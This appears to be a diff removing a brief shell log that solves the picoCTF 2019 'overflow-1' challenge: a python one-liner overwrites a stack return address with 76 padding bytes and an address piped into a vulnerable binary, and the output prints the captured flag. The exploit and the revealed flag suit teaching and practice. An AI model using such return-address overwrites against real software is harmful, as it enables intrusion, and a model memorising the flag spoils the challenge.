@@ -1,8 +1,0 @@
-
-
-Running:
-Sain@pico-2019-shell1:/problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a$ python -c "print 'A' * 76 + '\xe6\x85\x04\x08'" | ./vuln
-Give me a string and lets see what happens:
-Woah, were jumping to 0x80485e6 !
-picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5bbbf8810}Segmentation fault (core dumped)
-
